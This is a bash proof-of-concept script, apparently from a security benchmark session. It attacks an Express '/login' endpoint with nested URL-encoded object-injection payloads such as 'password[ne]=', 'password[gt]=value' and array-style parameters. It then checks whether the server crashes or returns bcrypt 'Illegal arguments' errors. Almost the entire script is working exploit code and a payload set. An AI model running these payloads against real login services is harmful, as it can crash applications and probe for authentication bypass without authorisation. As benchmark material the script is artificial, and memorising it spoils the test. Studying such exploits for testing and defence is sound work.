#!/bin/bash
# POC: Demonstrates Object Injection vulnerability via nested URL-encoded parameters with comprehensive testing
# Target: ./repo
# Created: 2025-12-01T16:17:07.232Z
# Session: benchmark-XBEN-099-24-minc74t1

# Object Injection Vulnerability via Extended URL-Encoded Parser (Version 3)
# This POC demonstrates type confusion when nested objects are passed as password parameter
# The application uses express.urlencoded with extended: true, allowing nested object parsing
# When password[ne]=value is sent, it's parsed as an object {ne: 'value'} instead of a string
# This causes bcrypt.compare to crash because it expects both parameters to be strings

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="/login"

echo "========================================"
echo "Object Injection POC - Version 3"
echo "Target: $TARGET_URL$ENDPOINT"
echo "========================================"
echo ""

# Configuration
TIMEOUT=10
VULNERABLE=0

# Function to test object injection payload
test_injection() {
    local payload="$1"
    local description="$2"
    
    echo "[*] Testing: $description"
    echo "    Payload: $payload"
    
    # Send request with timeout
    RESPONSE=$(curl -s -m $TIMEOUT -X POST "$TARGET_URL$ENDPOINT" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "$payload" \
      -w "\n%{http_code}%{errno}" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1 | grep -oE '[0-9]{3}')
    ERRNO=$(echo "$RESPONSE" | tail -n1 | grep -oE '[0-9]+$' | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    
    echo "    Response HTTP Code: ${HTTP_CODE:-N/A}"
    echo "    Curl Exit Code/Errno: $ERRNO"
    
    # Analyze response
    if [ -z "$HTTP_CODE" ] || [ "$HTTP_CODE" = "000" ]; then
        echo "    [+] VULNERABLE: Connection aborted/closed (possible crash)"
        VULNERABLE=$((VULNERABLE + 1))
        return 0
    elif [ "$HTTP_CODE" = "500" ]; then
        echo "    [+] VULNERABLE: Server returned 500 error"
        if echo "$BODY" | grep -qi "illegal"; then
            echo "    [+] CONFIRMED: 'Illegal arguments' error detected in response"
        fi
        VULNERABLE=$((VULNERABLE + 1))
        return 0
    elif echo "$BODY" | grep -qi "illegal arguments"; then
        echo "    [+] VULNERABLE: 'Illegal arguments' error in response"
        VULNERABLE=$((VULNERABLE + 1))
        return 0
    elif echo "$BODY" | grep -qi "bcrypt"; then
        echo "    [+] VULNERABLE: Bcrypt error in response"
        VULNERABLE=$((VULNERABLE + 1))
        return 0
    else
        echo "    [-] No vulnerability indicators (HTTP $HTTP_CODE)"
        return 1
    fi
}

# Test 0: Connectivity check
echo "[*] Test 0: Checking connectivity to target"
if ! timeout 5 curl -s -o /dev/null -m 5 "$TARGET_URL/info" 2>/dev/null; then
    echo "[-] WARNING: Cannot reach target. POC will attempt injection anyway."
    echo "    Ensure the application is running at: $TARGET_URL"
else
    echo "[+] Target is reachable"
fi
echo ""

# Test 1: Baseline - normal login (should not crash)
echo "[*] Test 1: Baseline - Normal login attempt"
test_injection "username=testuser&password=testpass" "Normal credentials"
echo ""

# Test 2: Primary injection - password[ne]= (empty nested object)
echo "[*] Test 2: Primary Injection - password[ne]="
test_injection "username=user0&password[ne]=" "Object injection with empty value"
echo ""

# Test 3: Injection with values - password[gt]=value
echo "[*] Test 3: Object Injection - password[gt]=value"
test_injection "username=user0&password[gt]=somevalue" "Object injection with MongoDB operator"
echo ""

# Test 4: Multiple nested levels - password[ne][x]=value
echo "[*] Test 4: Deep Nesting - password[ne][x]=value"
test_injection "username=user0&password[ne][x]=value" "Deeply nested object injection"
echo ""

# Test 5: Array injection - password[]=value
echo "[*] Test 5: Array Injection - password[]=value"
test_injection "username=user0&password[]=value" "Array-style parameter"
echo ""

# Test 6: Post-injection connectivity check
echo "[*] Test 6: Post-injection connectivity check"
sleep 1
if ! timeout 5 curl -s -o /dev/null -m 5 "$TARGET_URL/info" 2>/dev/null; then
    echo "[+] VULNERABLE: Application appears to have crashed after injection"
    VULNERABLE=$((VULNERABLE + 1))
else
    echo "[*] Application still responsive after injection attempts"
fi
echo ""

# Summary
echo "========================================"
if [ $VULNERABLE -gt 0 ]; then
    echo "Result: VULNERABLE to Object Injection"
    echo "Detection Count: $VULNERABLE indicators found"
    echo "========================================"
    exit 0
else
    echo "Result: No vulnerability indicators detected"
    echo "Note: Application may be patched or not running"
    echo "========================================"
    exit 1
fi